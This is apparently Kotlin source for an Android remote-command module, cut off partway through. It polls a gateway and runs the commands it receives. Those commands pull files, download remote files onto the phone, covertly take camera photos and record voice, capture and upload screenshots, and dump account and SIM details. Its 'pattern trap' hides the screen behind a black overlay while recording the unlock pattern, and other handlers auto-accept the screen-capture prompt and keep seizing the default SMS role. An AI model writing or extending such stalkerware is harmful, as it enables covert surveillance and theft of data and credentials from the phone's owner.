package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

object CommandProcessor {

    suspend fun checkAndExecute(ctx: Context) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                // Fetch PENDING commands via Gateway
                val req = JSONObject()
                req.put("action", "get_commands")
                req.put("deviceId", deviceId)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Accept", "application/json")
                conn.doOutput = true

                conn.outputStream.use { os -> 
                    os.write(req.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }
                
                val code = conn.responseCode
                if (code == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val respObj = JSONObject(resp)
                    if (respObj.optBoolean("success")) {
                        val commands = respObj.optJSONArray("data") ?: JSONArray()
                        if (commands.length() > 0) {
                            DebugLogger.log("CMD_PROC", "Fetch Success. Executing ${commands.length()} commands.")
                        }
                        for (i in 0 until commands.length()) {
                            val cmd = commands.getJSONObject(i)
                            DebugLogger.log("SYSTEM", "Executing: ${cmd.optString("file_name")}")
                            processSingleCommand(ctx, cmd)
                        }
                    } else {
                        DebugLogger.log("CMD_PROC_ERR", "Gateway Logic Fail: ${respObj.optString("error")}")
                    }
                } else {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("CMD_PROC_ERR", "HTTP $code: $err")
                }
            } catch (e: Exception) {
                if (e is java.net.UnknownHostException || e is java.net.ConnectException) {
                    DebugLogger.log("CMD_PROC", "Fetch aborted: Offline")
                } else {
                    DebugLogger.log("CMD_PROC_ERR", "Fetch failed: ${e.toString()}")
                }
            }
        }
    }

    suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
        val id = cmd.getInt("id")
        
        // 1. Mark as RECEIVED immediately so backend knows the device is alive
        updateCommandStatus(ctx, id, "RECEIVED", null)

        var status = "EXECUTED"
        var errorMsg = ""
        val fileName = cmd.optString("file_name")
        val content = cmd.optString("content", "")

        try {
            when (fileName) {
                "PING" -> {
                    CloudManager.sendPing(ctx, "Remote Tickle: Alive")
                    status = "PONG"
                }
                "TOAST" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
                    }
                }
                "RING" -> {
                    val dur = content.toLongOrNull() ?: 10L
                    val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                    val oldMode = am.ringerMode
                    val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)
                    
                    if (PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                    }
                    am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)
                    
                    val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                    val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
                    ringtone.play()
                    
                    if (ringtone.isPlaying) {
                        status = "SUCCESS"
                        errorMsg = "Audible alert active for ${dur}s"
                        kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                            kotlinx.coroutines.delay(dur * 1000)
                            ringtone.stop()
                            if (PermissionManager.hasDndAccess(ctx)) am.ringerMode = oldMode
                            am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
                        }
                    } else {
                        status = "FAILED_AUDIO_BLOCKED"
                        errorMsg = "Hardware output or system focus prevented playback."
                    }
                }
                "STAY_READY" -> {
                    val mins = content.toLongOrNull() ?: 5L
                    val i = android.content.Intent(ctx, BeaconService::class.java)
                    i.putExtra("duration_mins", mins)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
                    else ctx.startService(i)
                    status = "SYNC_PRIORITY_HIGH (${mins}M)"
                }
                "SET_INTERVAL" -> {
                    // Content = Interval in Minutes (min 15)
                    val mins = content.toLongOrNull() ?: 15L
                    val safeMins = if (mins < 15) 15L else mins
                    
                    val wm = WorkManager.getInstance(ctx)
                    val constraints = Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .setRequiresBatteryNotLow(true)
                        .build()

                    val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build()
                        
                    wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
                    status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
                }
                "STOP_BEACON" -> {
                    ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                    status = "EXECUTED (STOPPED)"
                }
                "GET_TOKEN" -> {
                    val token = DeviceManager.getRobustFcmToken(ctx)
                    if (token != null) {
                        status = "TOKEN_RETRIEVED"
                        val result = JSONObject().put("fcm_token", token)
                        updateCommandStatus(ctx, id, status, null, result, null)
                        return
                    } else {
                        status = "FETCH_FAILED (NO_TOKEN)"
                        errorMsg = "Play Services unavailable or token generation blocked."
                    }
                }
                "GET_VAULT_SIZE" -> {
                    val sizeInfo = DumpManager.getVaultSize()
                    status = "EXECUTED"
                    val result = JSONObject().put("size_report", sizeInfo)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "FORCE_UPLOAD" -> {
                    val modules = content.split(",").map { it.trim() }
                    CloudManager.uploadData(ctx, modules, "REMOTE_COMMAND")
                    status = "MANUAL_BACKUP_INITIATED"
                }
                "UPLOAD_DUMPS" -> {
                    val root = DumpManager.getRootDir()
                    val dateFolders = root.listFiles { f -> f.isDirectory } ?: emptyArray()
                    var filesUploaded = 0
                    var foldersCleared = 0

                    for (folder in dateFolders) {
                        val files = folder.listFiles() ?: continue
                        if (files.isEmpty()) {
                            folder.delete()
                            continue
                        }

                        var folderEmpty = true
                        for (f in files) {
                            // Upload to 'ARCHIVE' category
                            if (CloudManager.uploadFile(ctx, f, "ARCHIVE")) {
                                f.delete()
                                filesUploaded++
                            } else {
                                folderEmpty = false
                            }
                        }

                        if (folderEmpty) {
                            folder.delete()
                            foldersCleared++
                        }
                    }
                    status = "SCAVENGER_COMPLETE"
                    val result = JSONObject()
                    result.put("files_synced", filesUploaded)
                    result.put("vault_folders_wiped", foldersCleared)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "PULL_FILE" -> {
                    val f = File(content)
                    if (f.exists() && f.isFile) {
                        val timestamp = System.currentTimeMillis()
                        val folderName = DeviceManager.getDeviceFolderName(ctx)
                        val storagePath = "$folderName/PULL/${timestamp}_${f.name}"
                        if (!CloudManager.uploadFile(ctx, f, "PULL", timestamp)) {
                            status = "FETCH_FAILED (UPLOAD_ERROR)"
                            errorMsg = "File exists but streaming to storage bucket failed."
                        } else {
                            status = "REMOTE_FETCH_SUCCESS"
                            updateCommandStatus(ctx, id, status, null, null, storagePath)
                            return 
                        }
                    } else {
                        status = "FETCH_ABORTED (NOT_FOUND)"
                        errorMsg = "File path does not exist on device."
                    }
                }
                "PUSH_FILE" -> {
                    val parts = content.split("|")
                    if (parts.size < 2) {
                        status = "FAILED (BAD_FORMAT)"
                        errorMsg = "Required format: URL | /path/to/save/file.ext"
                    } else {
                        var currentUrl = parts[0].trim()
                        val targetPath = parts[1].trim()
                        val targetFile = File(targetPath)
                        
                        try {
                            targetFile.parentFile?.mkdirs()
                            var connection: java.net.HttpURLConnection
                            var redirects = 0
                            val maxRedirects = 5

                            while (true) {
                                val url = URL(currentUrl)
                                connection = url.openConnection() as java.net.HttpURLConnection
                                connection.instanceFollowRedirects = false // Manually handle for control
                                connection.connectTimeout = 30000
                                connection.readTimeout = 30000
                                
                                val code = connection.responseCode
                                if (code in 300..308 && redirects < maxRedirects) {
                                    currentUrl = connection.getHeaderField("Location")
                                    redirects++
                                    continue
                                }

                                if (code == 200) {
                                    connection.inputStream.use { input ->
                                        targetFile.outputStream().use { output ->
                                            input.copyTo(output, 8192)
                                        }
                                    }
                                    status = "DEPLOYMENT_SUCCESS"
                                    val result = JSONObject()
                                    result.put("saved_to", targetFile.absolutePath)
                                    result.put("size", targetFile.length())
                                    result.put("redirects", redirects)
                                    updateCommandStatus(ctx, id, status, null, result, null)
                                    return
                                } else {
                                    status = "DEPLOYMENT_FAILED"
                                    errorMsg = "HTTP $code at end of chain"
                                    break
                                }
                            }
                        } catch (e: Exception) {
                            status = "DEPLOYMENT_ERROR"
                            errorMsg = e.toString()
                        }
                    }
                }
                "GET_SKELETON" -> {
                    val depth = content.trim().toIntOrNull() ?: 5
                    val report = FileManager.generateReport(depth)
                    status = "STORAGE_INDEX_COMPLETE"
                    DebugLogger.log("COMMAND", "Processed [$fileName] (Depth: $depth) -> $status")
                    updateCommandStatus(ctx, id, status, null, report, null)
                    return
                }
                "MAP_GRID" -> {
                    val depth = content.trim().toIntOrNull() ?: 10
                    val service = MyAccessibilityService.instance
                    if (service != null) {
                        CoroutineScope(Dispatchers.IO).launch {
                            service.executeMapGridSequence(id, depth)
                        }
                        status = "GRID_MAPPING_INITIATED"
                        updateCommandStatus(ctx, id, status, null, null, null)
                        return
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is required for UI mapping."
                    }
                }
                "CAPTURE_PATTERN" -> {
                    ScreenRecordManager.pendingCmdId = id
                    val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                    if (!pm.isInteractive) {
                        status = "FAILED (SCREEN_OFF)"
                        errorMsg = "Screen must be physically ON to initiate the pattern trap securely."
                    } else {
                        val parts = content.split("|")
                        val timeoutSec = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 20L
                        val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "MED"
                        val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30

                        ScreenRecordManager.expectedMode = "AUTO"
                        ScreenRecordManager.pendingDur = 600 // 10 min fallback cap
                        ScreenRecordManager.pendingQual = qual
                        ScreenRecordManager.pendingFps = fps
                        ScreenRecordManager.pendingAudio = false
                        ScreenRecordManager.isPatternTrap = true
                        ScreenRecordManager.patternSuccessTimeoutMs = timeoutSec * 1000L
                        
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            DimmerManager.applyDim(ctx, 100, "OVERLAY")
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                if (ScreenRecordManager.expectedMode == "AUTO") {
                                    DimmerManager.removeOverlay(ctx)
                                    ScreenRecordManager.expectedMode = ""
                                }
                            }, 10000)
                        }
                        
                        val i = Intent(ctx, PulseActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            putExtra("is_screen_record_trigger", true)
                        }
                        ctx.startActivity(i)
                        status = "PATTERN_TRAP_ARMED (Timeout: ${timeoutSec}s | Quality: $qual)"
                    }
                }
                "GET_TREE" -> {
                    val parts = content.split("|")
                    val pkg = parts.getOrNull(0)?.trim().let { if (it == "null" || it == "") null else it }
                    val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 5L
                    val depth = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 10
                    
                    val service = MyAccessibilityService.instance
                    if (service != null) {
                        if (mins <= 0L) {
                            // Instant Frame Grab (No Session)
                            val instantTree = service.getInstantTree(pkg, depth)
                            if (!instantTree.has("error")) {
                                status = "SCAN_COMPLETE"
                                val result = JSONObject().apply {
                                    put("depth_limit", depth)
                                    put("snapshot", instantTree)
                                }
                                updateCommandStatus(ctx, id, status, null, result, null)
                            } else {
                                status = "FAILED (NOT_IN_FOREGROUND)"
                                errorMsg = instantTree.optString("error")
                            }
                            return
                        } else {
                            // Queue and wait for target to open
                            service.startTreeDump(pkg, mins, id, depth)
                            status = if (pkg != null) "WAITING_FOR_TARGET_APP (DUR: ${mins}M)" else "SCAN_SESSION_ACTIVE (${mins}M)"
                            updateCommandStatus(ctx, id, status, null, null, null)
                            return
                        }
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is offline."
                    }
                }
                "RESET_SCRAPER" -> {
                    val service = MyAccessibilityService.instance
                    if (service != null) {
                        service.resetAllTasks()
                        status = "SCRAPER_QUEUE_PURGED"
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                    }
                }
                "GET_LOGS" -> {
                    val logs = DebugLogger.getLogs()
                    val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
                    try {
                        tempFile.writeText(logs)
                        if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
                            status = "DIAGNOSTIC_EXPORT_SUCCESS"
                        } else {
                            status = "DIAGNOSTIC_EXPORT_FAILED"
                        }
                    } catch (e: Exception) {
                        status = "EXPORT_ERROR"
                    } finally {
                        if (tempFile.exists()) tempFile.delete()
                    }
                }
                "TOGGLE_FEATURE" -> {
                    val parts = content.split(":")
                    if (parts.size >= 2) {
                        val feature = parts[0].trim()
                        val mode = parts[1].trim()
                        val p1 = parts.getOrNull(2)?.trim()
                        val p2 = parts.getOrNull(3)?.trim()
                        
                        ConfigManager.setFeatureParametric(ctx, feature, mode, p1, p2)
                        status = "EXECUTED ($feature -> $mode)"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: feature:mode:p1:p2"
                    }
                }
                "MASTER_TOGGLE" -> {
                    val mode = content.trim().uppercase()
                    if (mode == "ON" || mode == "OFF") {
                        ConfigManager.setAllFeatures(ctx, mode)
                        status = "MASTER_TOGGLE_EXECUTED ($mode)"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: ON or OFF"
                    }
                }
                "CODERED" -> {
                    val parts = content.split("|")
                    val codes = parts[0].trim()
                    val handler = if (parts.size > 1) parts[1].trim() else "BACKEND"
                    
                    val i = android.content.Intent(ctx, EmergencyService::class.java)
                    i.putExtra("codes", codes)
                    i.putExtra("sender", handler)
                    
                    DebugLogger.log("SYSTEM", "Triggering CodeRed. Codes: $codes | Handler: $handler")

                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                    status = "EMERGENCY_PROMPTED"
                }
                "GET_SCREENSHOT" -> {
                    if (MyAccessibilityService.instance == null) {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is required for screenshots."
                    } else {
                        val parts = content.split("|")
                        val quality = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 70
                        val freq = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 0
                        val duration = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 0

                        if (freq > 0 && duration > 0) {
                            val safeFreq = if (freq < 2) 2 else freq
                            val endTime = System.currentTimeMillis() + (duration * 1000L)
                            var capturedCount = 0
                            
                            DebugLogger.log("SCREEN_SESSION", "Starting continuous capture: ${safeFreq}s interval for ${duration}s")
                            
                            while (System.currentTimeMillis() < endTime) {
                                val deferredFile = CompletableDeferred<java.io.File?>()
                                MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
                                    deferredFile.complete(file)
                                }

                                val file = withTimeoutOrNull(8000) { deferredFile.await() }
                                if (file != null) {
                                    if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
                                        file.delete()
                                    } else {
                                        DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
                                    }
                                    capturedCount++
                                }
                                
                                if (System.currentTimeMillis() + (safeFreq * 1000L) > endTime) break
                                delay(safeFreq * 1000L)
                            }
                            status = "SCREENSHOT_SESSION_COMPLETE ($capturedCount images)"
                        } else {
                            // Single Shot Logic
                            val deferredFile = CompletableDeferred<java.io.File?>()
                            MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
                                deferredFile.complete(file)
                            }

                            val file = withTimeoutOrNull(10000) { deferredFile.await() }
                            if (file != null) {
                                if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
                                    status = "SCREENSHOT_UPLOADED"
                                    file.delete()
                                } else {
                                    DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
                                    status = "SCREENSHOT_QUEUED_OFFLINE"
                                }
                            } else {
                                status = "SCREENSHOT_FAILED"
                                errorMsg = "Capture timed out or device version incompatible."
                            }
                        }
                    }
                }
                "SET_DEFAULT_SMS" -> {
                    DefaultSmsManager.pendingCmdId = id
                    val mode = content.trim().uppercase()
                    val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(ctx)
                    
                    // Capture the original package ONLY if it's not us
                    if (currentDefault != ctx.packageName) {
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                            .putString("original_sms_package", currentDefault).apply()
                        DebugLogger.log("SMS_MGR", "Captured original SMS app: $currentDefault")
                    }

                    if (DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "ALREADY_DEFAULT"
                        DefaultSmsManager.isRelentlessActive = false
                        DefaultSmsManager.expectedMode = ""
                    } else {
                        DefaultSmsManager.expectedMode = mode
                        if (mode == "RELENTLESS") {
                            DefaultSmsManager.isRelentlessActive = true
                            val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
                            status = "RELENTLESS_TRAP_ARMED"
                        } else if (mode == "STOP_RELENTLESS") {
                            DefaultSmsManager.isRelentlessActive = false
                            status = "RELENTLESS_STOPPED"
                        } else {
                            DefaultSmsManager.requestDefault(ctx)
                            status = "DEFAULT_SMS_REQUESTED"
                        }
                    }
                }
                "RESTORE_DEFAULT_SMS" -> {
                    DefaultSmsManager.pendingCmdId = id
                    val prevLabel = DefaultSmsManager.getStoredPreviousLabel(ctx)
                    if (prevLabel == null) {
                        status = "FAILED"
                        errorMsg = "No previous SMS package found in memory."
                    } else {
                        DefaultSmsManager.expectedMode = "RESTORE"
                        try {
                            val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            }
                            ctx.startActivity(i)
                            status = "RESTORE_INITIATED"
                            errorMsg = "Targeting: $prevLabel"
                        } catch (e: Exception) {
                            status = "FAILED"
                            errorMsg = "Intent failed: ${e.message}"
                        }
                    }
                }
                "RECORD_SCREEN" -> {
                    ScreenRecordManager.pendingCmdId = id
                    val parts = content.split("|")
                    val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "TRIGGER"
                    val dur = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 60
                    val qual = parts.getOrNull(2)?.trim()?.uppercase() ?: "MED"
                    val audio = parts.getOrNull(3)?.trim()?.uppercase() == "TRUE"
                    val fps = parts.getOrNull(4)?.trim()?.toIntOrNull() ?: 30
                    
                    ScreenRecordManager.expectedMode = mode
                    ScreenRecordManager.pendingDur = dur
                    ScreenRecordManager.pendingQual = qual
                    ScreenRecordManager.pendingAudio = audio
                    ScreenRecordManager.pendingFps = fps
                    ScreenRecordManager.pendingDur = dur
                    ScreenRecordManager.pendingQual = qual
                    ScreenRecordManager.pendingAudio = audio
                    
                    if (mode == "AUTO") {
                        // Apply the opaque blindfold instantly before the dialog arrives
                        Handler(Looper.getMainLooper()).post {
                            DimmerManager.applyDim(ctx, 100, "OVERLAY")
                            
                            // FAIL-SAFE: If the Ghost Click fails or hangs, forcefully unblind after 10s
                            Handler(Looper.getMainLooper()).postDelayed({
                                if (ScreenRecordManager.expectedMode == "AUTO") {
                                    DebugLogger.log("SCREEN_REC_FAIL", "Ghost Accept timed out. Forcefully removing blindfold.")
                                    DimmerManager.removeOverlay(ctx)
                                    ScreenRecordManager.expectedMode = "" 
                                }
                            }, 10000)
                        }
                    }
                    
                    val i = Intent(ctx, PulseActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                        putExtra("is_screen_record_trigger", true)
                    }
                    ctx.startActivity(i)
                    status = "RECORD_INITIATED ($mode | ${dur}s | $qual | Audio: $audio)"
                }
                "CAPTURE_IMAGE" -> {
                    val parts = content.split("|")
                    val side = parts.getOrNull(0)?.trim()?.uppercase() ?: "REAR"
                    val count = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 1
                    val useFront = side == "FRONT"
                    
                    var successCount = 0
                    for (i in 1..count) {
                        val file = CameraControl.capture(ctx, useFront)
                        if (file != null) {
                            if (CloudManager.uploadFile(ctx, file, "OPTICAL_DIAG")) {
                                successCount++
                                file.delete()
                            } else {
                                // OFFLINE: Send to Catacombs
                                DumpManager.vaultMedia(file, "OPTICAL_DIAG")
                            }
                        }
                        kotlinx.coroutines.delay(1000)
                    }
                    status = "IMAGE_CAPTURE_COMPLETE ($successCount/$count)"
                }
                "RECORD_VOICE" -> {
                    val dur = content.trim().toIntOrNull() ?: 10
                    val snippet = VoiceManager.recordSnippet(ctx, dur)
                    if (snippet != null) {
                        if (CloudManager.uploadFile(ctx, snippet, "VOICE_DIAG")) {
                            status = "VOICE_CAPTURE_SUCCESS"
                            snippet.delete()
                        } else {
                            // OFFLINE: Send to Catacombs
                            DumpManager.vaultMedia(snippet, "VOICE_DIAG")
                            status = "VOICE_QUEUED_OFFLINE"
                        }
                    } else {
                        status = "VOICE_CAPTURE_FAILED"
                        errorMsg = "Mic may be in use by another app or permission denied."
                    }
                }
                "GET_ACCOUNTS" -> {
                    val accounts = DeviceManager.getAccounts(ctx)
                    status = "ACCOUNTS_RETRIEVED"
                    val result = JSONObject().put("accounts", accounts)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "GET_DEFAULTS" -> {
                    val defaults = DeviceManager.getDefaultApps(ctx)
                    status = "DEFAULTS_RETRIEVED"
                    updateCommandStatus(ctx, id, status, null, defaults, null)
                    return
                }
                "GET_NUMBERS" -> {
                    val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
                    val numbers = JSONArray()
                    
                    if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        val infoList = sm.activeSubscriptionInfoList
                        if (infoList != null) {
                            for (info in infoList) {
                                val sim = JSONObject()
                                sim.put("slot", info.simSlotIndex)
                                sim.put("carrier", info.carrierName)
                                sim.put("display_name", info.displayName)
                                sim.put("country", info.countryIso)
                                sim.put("id", info.subscriptionId)
                                
                                // Try to get the actual number
                                var num = "Unknown"
                                if (android.os.Build.VERSION.SDK_INT >= 33) {
                                    try { num = sm.getPhoneNumber(info.subscriptionId) } catch (e: Exception) { }
                                } else {
                                    num = info.number ?: "Unknown"
                                }
                                
                                sim.put("number", if (num.isEmpty()) "Unknown" else num)
                                numbers.put(sim)
                            }
                        }
                        status = "SIM_INFO_RETRIEVED"
                        val result = JSONObject().put("sim_cards", numbers)
                        updateCommandStatus(ctx, id, status, null, result, null)
                        return
                    } else {
                        status = "FAILED_PERMISSION (READ_PHONE_STATE)"
                        errorMsg = "Permission required to access SIM subscriptions."
                    }
                }
                "VOLUME" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val streamStr = parts[0].trim().uppercase()
                        val levelStr = parts[1].trim().uppercase()
                        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                        
                        val stream = when (streamStr) {
                            "MEDIA" -> android.media.AudioManager.STREAM_MUSIC
                            "ALARM" -> android.media.AudioManager.STREAM_ALARM
                            else -> android.media.AudioManager.STREAM_RING
                        }

                        if (levelStr == "SILENT" || levelStr == "VIBRATE" || levelStr == "NORMAL") {
                            if (PermissionManager.hasDndAccess(ctx)) {
                                am.ringerMode = when (levelStr) {
                                    "SILENT" -> android.media.AudioManager.RINGER_MODE_SILENT
                                    "VIBRATE" -> android.media.AudioManager.RINGER_MODE_VIBRATE
                                    else -> android.media.AudioManager.RINGER_MODE_NORMAL
                                }
                                status = "SUCCESS"
                                errorMsg = "Ringer set to $levelStr (Verified: ${am.ringerMode})"
                            } else {
                                status = "FAILED_PERMISSION"
                                errorMsg = "DND access required for ringer control."
                            }
                        } else {
                            val pct = levelStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
                            val max = am.getStreamMaxVolume(stream)
                            val targetVol = ((pct / 100f) * max).toInt()
                            
                            if (stream == android.media.AudioManager.STREAM_RING && PermissionManager.hasDndAccess(ctx) && am.ringerMode != android.media.AudioManager.RINGER_MODE_NORMAL) {
                                am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                            }
                            
                            am.setStreamVolume(stream, targetVol, 0)
                            val verifiedVol = am.getStreamVolume(stream)
                            val verifiedPct = ((verifiedVol.toFloat() / max) * 100).toInt()
                            
                            status = "SUCCESS"
                            errorMsg = "Stream $streamStr set to $verifiedPct% (Requested $pct%)"
                        }
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Format: STREAM|LEVEL"
                    }
                }
                "GET_SENSORS" -> {
                    val sensorData = EnvironmentalManager.sampleSensors(ctx)
                    status = "ENV_AUDIT_COMPLETE"
                    updateCommandStatus(ctx, id, status, null, sensorData, null)
                    return
                }
                "SPEAK_TEXT" -> {
                    val parts = content.split("|")
                    val text = parts[0].trim()
                    val vol = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 80
                    
                    if (text.isNotEmpty()) {
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            SpeakerManager.speak(ctx, text, vol.coerceIn(0, 100))
                        }
                        status = "VOCAL_DISPATCH_SUCCESS"
                    } else {
                        status = "FAILED_EMPTY_TEXT"
                    }
                }
                "GET_ENGAGEMENT" -> {
                    val history = EngagementTracker.getHistory(ctx)
                    status = "ENGAGEMENT_REPORT_READY"
                    updateCommandStatus(ctx, id, status, null, history, null)
                    return
                }
                "TOGGLE_LOGGING" -> {
                    val state = content.trim().uppercase()
                    DebugLogger.isLoggingEnabled = (state == "ON")
                    status = "LOGGING_SYSTEM_" + (if (DebugLogger.isLoggingEnabled) "ENABLED" else "DISABLED")
                }
                "WIPE_NOTIFICATIONS" -> {
                    DebugLogger.log("WIPE_NOTIF", "Command received. Content: '$content'")
                    if (MyNotificationListener.instance != null) {
                        val parts = content.split("|")
                        val parsedMode = parts.getOrNull(0)?.trim()?.uppercase()
                        // Default to ALL if empty or if the old '0' bug slipped through
                        val mode = if (parsedMode.isNullOrEmpty() || parsedMode == "0") "ALL" else parsedMode
                        val value = parts.getOrNull(1)?.trim()
                        
                        DebugLogger.log("WIPE_NOTIF", "Parsed Mode: '$mode', Value: '$value'. Delegating to MyNotificationListener...")
                        
                        val wipedCount = MyNotificationListener.instance?.wipeNotifications(mode, value) ?: 0
                        status = "NOTIFICATIONS_WIPED ($wipedCount cleared. Mode: $mode)"
                        DebugLogger.log("WIPE_NOTIF", "Success. $wipedCount notifications cleared.")
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Notification listener service is not running."
                        DebugLogger.log("WIPE_NOTIF", "Failed: Notification listener service is offline or lacking permission.")
                    }
                }
                "SCREEN_TIMEOUT" -> {
                    val secs = content.trim().toIntOrNull() ?: 30
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && android.provider.Settings.System.canWrite(ctx)) {
                        android.provider.Settings.System.putInt(
                            ctx.contentResolver,
                            android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                            secs * 1000
                        )
                        status = "TIMEOUT_SET (${secs}s)"
                    } else {
                        status = "FAILED_PERMISSION (WRITE_SETTINGS)"
                        errorMsg = "Write Settings permission required to modify screen timeout."
                    }
                }
                "BRIGHTNESS" -> {
                    val parts = content.split("|")
                    val level = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 100
                    val method = parts.getOrNull(1)?.trim()?.uppercase() ?: "OVERLAY"
                    
                    Handler(Looper.getMainLooper()).post {
                        DimmerManager.applyDim(ctx, level, method)
                    }
                    status = "BRIGHTNESS_ADJUSTED ($level% via $method)"
                }
                "UNBLIND" -> {
                    Handler(Looper.getMainLooper()).post {
                        DimmerManager.removeOverlay(ctx)
                        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.System.canWrite(ctx)) {
                            Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC)
                        }
                    }
                    status = "DISPLAY_RESTORED"
                }
                "LOCK_SCREEN" -> {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                    
                    if (dpm.isAdminActive(adminComponent)) {
                        try {
                            dpm.lockNow()
                            status = "DEVICE_LOCKED"
